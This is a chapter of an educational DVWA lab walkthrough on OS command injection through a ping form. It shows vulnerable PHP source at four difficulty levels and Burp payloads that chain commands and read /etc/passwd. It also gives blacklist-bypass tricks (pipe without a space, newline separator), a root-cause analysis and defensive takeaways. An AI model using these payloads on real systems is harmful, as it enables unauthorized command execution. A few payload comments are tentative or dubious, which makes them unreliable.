# Chapter 02 — Command Injection (DVWA Module: Command Injection)

## Objective
Inject OS shell commands into a vulnerable `ping` utility form and understand shell metacharacter filtering bypasses.

## Prerequisites
- Target: `http://localhost/dvwa/vulnerabilities/exec/`
- Burp Repeater open, request captured via Proxy

---

## 🟢 LOW

### Source logic
```php
$target = $_REQUEST[ 'ip' ];
$cmd = shell_exec( 'ping  -c 4 ' . $target );
```
No input validation at all — raw concatenation into `shell_exec`.

### Burp Suite steps
1. Intercept the form POST (`ip=127.0.0.1&Submit=submit`).
2. Send to **Repeater**.
3. Modify the `ip` parameter using command chaining operators:
   ```
   ip=127.0.0.1 && whoami
   ip=127.0.0.1; id
   ip=127.0.0.1 | cat /etc/passwd
   ip=127.0.0.1 %26%26 whoami   (URL-encoded &&)
   ```
4. Send and observe the command output appended to the ping results in the response body.

### Why it works
User input flows unsanitized into a shell execution function. Shell metacharacters (`;`, `&&`, `|`, `||`, backticks, `$()`) allow chaining arbitrary commands after the intended `ping`.

---

## 🟡 MEDIUM

### Source logic
```php
$substitutions = array(
    '&&' => '',
    ';'  => '',
);
$target = str_replace( array_keys($substitutions), $substitutions, $target );
```
Blacklists only `&&` and `;` literally.

### Burp Suite bypass payloads (Repeater)
```
ip=127.0.0.1 | whoami
ip=127.0.0.1 || whoami          (single characters not blocked individually? test — DVWA medium blocks && and ; only)
ip=127.0.0.1 %0a whoami          (newline as command separator, URL-encoded \n)
ip=127.0.0.1 & whoami            (single & often still works, only && string is blocked)
```
Also try **case/encoding tricks** if the blacklist is naive:
```
ip=127.0.0.1;;whoami            (double ; collapses to one after replace, leaving one behind — test target-specific)
```

### Why the bypass works
`str_replace` only removes the *exact substrings* `&&` and `;`. Other equally valid shell separators (`|`, single `&`, newline `%0a`) are untouched. This is a classic **blacklist-is-incomplete** flaw.

---

## 🔴 HIGH

### Source logic
```php
$substitutions = array(
    '&'  => '', ';'  => '', '| ' => '', '-' => '',
    '$'  => '', '('  => '', ')'  => '', '`'  => '',
    '||' => '',
);
```
Blocks a much larger set, including `| ` (pipe **with trailing space**).

### Burp Suite bypass
Notice the blacklist for pipe is `'| '` (pipe + space) — not bare `|`. Try:
```
ip=127.0.0.1 |whoami        (pipe with NO space after it)
ip=127.0.0.1|whoami
```
This slips past the `'| '` string match since there's no space right after the pipe.

### Why it (partially) fails
Even a longer blacklist is still a **blacklist** — enumerable and bypassable by any character sequence its authors didn't anticipate (spacing variants here).

---

## ⚪ IMPOSSIBLE

### Source logic
```php
$target = $_REQUEST[ 'ip' ];
$target = stripslashes( $target );
// Split by octet & whitelist-validate as an IPv4 address
$octet = explode( ".", $target );
if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) &&
    ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) &&
    ( sizeof( $octet ) == 4 ) ) {
    $target = implode( ".", $octet );
    $cmd = shell_exec( 'ping  -c 4 ' . $target );
}
else {
    // reject
}
// Uses CSRF token too
```

### Why the attack fails
This is **input whitelisting**, not blacklisting: input must match the exact shape of a valid IPv4 address (4 numeric octets). Anything containing shell metacharacters simply fails the `is_numeric()` checks and is rejected outright — there's no string left for a shell separator to hide in.

### Burp Suite exercise
Try every payload from Low/Medium/High against Impossible — all should return "Invalid input" / no command execution, proving the whitelist approach closes the whole vulnerability class rather than patching individual symbols.

---

## Root Cause Analysis
Command injection stems from **untrusted input reaching a shell interpreter**. Blacklisting specific characters is fundamentally reactive and incomplete. The durable fix is either (a) strict input whitelisting/validation, or (b) avoiding shell invocation entirely by using safe APIs (e.g., PHP's `escapeshellarg()`, or language-native ping libraries that don't spawn a shell).

## Defensive Takeaways
- Never build shell commands via string concatenation with user input.
- Prefer `escapeshellarg()` / `escapeshellcmd()` if shelling out is unavoidable, or better, parameterized subprocess APIs with argument arrays (no shell=True).
- Validate input against a strict format (regex/whitelist), not a blacklist of "bad" characters.
- Run any inevitable OS commands with least privilege, in a sandboxed/containerized context.

---
⬅ [Back: Brute Force](01-brute-force.md) | ➡ [Next: CSRF](03-csrf.md)
